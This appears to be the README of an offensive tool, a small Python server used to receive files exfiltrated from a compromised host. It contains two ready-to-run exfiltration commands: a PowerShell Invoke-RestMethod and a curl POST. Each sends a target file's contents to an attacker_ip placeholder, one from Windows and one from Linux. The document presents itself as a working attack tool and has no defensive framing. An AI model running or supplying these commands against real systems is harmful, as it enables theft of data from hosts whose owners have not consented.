# httpInvokeDownload
Small Python Server used to download files from a compromised host.

Run this server, then:
- run `Invoke-RestMethod -URI http://*attacker_ip*/*vercode*/*filename* -Method Post -InFile ”*target_file*”` on compromised Windows host.

- run `curl -X POST -d "$(cat *target_file*)" http://*attacker_ip*/*vercode*/*filename*` on compromised Linux host.
